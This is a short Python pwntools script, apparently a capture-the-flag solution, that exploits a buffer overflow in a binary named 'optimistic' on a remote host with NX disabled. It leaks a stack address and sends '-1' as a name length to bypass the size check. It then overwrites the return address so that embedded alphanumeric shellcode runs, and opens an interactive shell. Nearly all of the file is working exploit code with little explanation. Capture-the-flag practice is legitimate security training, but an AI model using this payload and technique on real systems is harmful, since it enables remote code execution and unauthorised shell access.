# Type: Buffer overflow, NX disabled

from pwn import *
import pwn
def main():
	context.log_level = 'DEBUG'
	#io = process('./optimistic')
	io = remote('64.227.39.89', '30989')
	
	#enumerate
	context(os='linux', arch='amd64')
	padding_length = 104
	stack_address_offset = -96
	
	#stack address
	io.sendlineafter(': ', 'y')
	stack_address = io.recvline().decode().strip().split()[-1][2:]
	stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
	stack_address = u64(stack_address, endian='big')
	stack_address += stack_address_offset
	print("Leaked stack address: ", pwn.p64(stack_address))
	
	#create payload
	shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
	#shellcode = asm(shellcraft.sh()) 
	padding = b'a' * (padding_length - len(shellcode))
	payload = shellcode + padding + p64(stack_address)
	
	#trigger overflow 
	io.sendlineafter('Email: ', 'email')
	io.sendlineafter('Age: ', 'age')
	io.sendlineafter('Length of name: ', '-1')
	io.sendlineafter('Name: ', payload)
	io.interactive()
	
	
if __name__ == "__main__":
	main()
	
